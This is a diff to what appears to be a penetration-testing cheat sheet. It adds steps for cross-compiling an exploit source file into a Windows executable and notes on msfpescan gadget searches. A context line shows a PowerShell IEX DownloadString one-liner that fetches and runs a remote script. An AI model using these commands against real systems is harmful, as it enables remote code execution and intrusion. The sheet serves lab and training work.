@@ -43,6 +43,12 @@
 
 # Misc
 
+## Cross-Compiling Exploit Code
+```
+sudo apt install mingw-w64
+i686-w64-mingw32-gcc 42341.c -o exploit.exe # In case of errors try -lws2_32 flag
+```
+
 ## Render webpages from command line
 * cutycapt: http://cutycapt.sourceforge.net/
 
@@ -1590,6 +1596,11 @@ powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14
 ```
 
 # Memory Analysis
+## msfpescan
+* Search for jump equivalent instruction
+* Search for pop+pop+ret combinations
+* Search for regex match
+
 ## Get Function Address
 ```
 objdump -d my.exe | grep func1
